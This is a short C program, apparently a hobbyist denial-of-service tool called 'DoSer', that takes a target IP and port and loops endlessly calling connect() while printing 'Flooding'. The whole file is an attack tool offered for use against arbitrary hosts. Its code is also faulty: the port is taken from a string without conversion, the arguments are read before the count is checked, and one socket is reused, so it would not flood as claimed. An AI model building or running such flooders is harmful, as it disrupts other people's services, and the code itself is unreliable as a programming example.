#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char *argv[]){

    int mysocket;
    int connection;

    char *dest;
    int port;


    dest = argv[1];
    port = argv[2];

    struct sockaddr_in target;

    if (argc <= 1){
        printf("Usage: ./DoSer 192.168.0.1 80\n");
        return 0;
    }

    mysocket = socket(AF_INET, SOCK_STREAM, 0);

    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    target.sin_addr.s_addr = inet_addr(dest);

    while (dest){
        
        printf("Flooding %s on port %d\n", target, port);
        connect(mysocket, (struct sockaddr *)&target, sizeof target);

}
}